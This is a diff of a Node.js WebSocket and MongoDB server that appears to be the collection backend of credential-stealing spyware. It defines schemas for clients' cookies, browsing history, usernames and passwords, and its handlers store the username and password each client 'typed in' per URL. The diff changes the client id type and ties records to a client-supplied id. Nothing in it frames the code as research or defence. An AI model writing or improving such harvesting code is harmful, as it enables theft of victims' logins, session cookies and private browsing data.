@@ -42,7 +42,7 @@ const wss = new SocketServer({ server });
 //document=row
 
 var clientStatus = new mongoose.Schema({//Schemas are predefined json formats that the mongodc collections use, not all fields/values need to be filled out in order to push data to db
-    id: {type: Number},
+    id: {type: String},
     status: { type: String}
   });
   /*
@@ -58,19 +58,19 @@ var clientPassword = new mongoose.Schema({
   });
   */
 var clientHistory = new mongoose.Schema({
-    id: {type: Number},
+    id: {type: String},
     url: { type: String},
     history: {type: [String]}
   });
   
 var clientCookies = new mongoose.Schema({
-    id: {type: Number},
+    id: {type: String},
     url: { type: String},
     name: {type: String},
     value: {type: String}
   });
 var clientLogin = new mongoose.Schema({
-    id: {type: Number},
+    id: {type: String},
     url: {type: String},
     username: {type: String},
     password: {type: String}
@@ -188,6 +188,7 @@ wss.on('connection', function connection(ws) {//Upon a connection from a client
         //if (type == 'cookie')//cookie
 
         if (type == 'username'){//if message is telling us that client typed in username
+            ws.id=data.id;
             ws.url=data.url;//get url from message
             ws.username=data.username;//get username from message
             var newUsername = new userLogin ({
@@ -196,7 +197,7 @@ wss.on('connection', function connection(ws) {//Upon a connection from a client
                 username: ws.username
             });
             userLogin.updateOne( { id: ws.id, url: ws.url }, 
-                { id: ws.id, url: ws.url,username : ws.username }, { upsert : true }, function (err, val) {
+                { username : ws.username }, { upsert : true }, function (err, val) {
                     //finds a document that matches id and url, if found, update username field
                     //if not found add such document
                 console.log(newUsername+" sent to db");
@@ -205,6 +206,7 @@ wss.on('connection', function connection(ws) {//Upon a connection from a client
         }
 
         if (type == 'password'){//password
+            ws.id = data.id;
             ws.url=data.url;
             ws.password=data.password;
             var newPassword = new userLogin ({
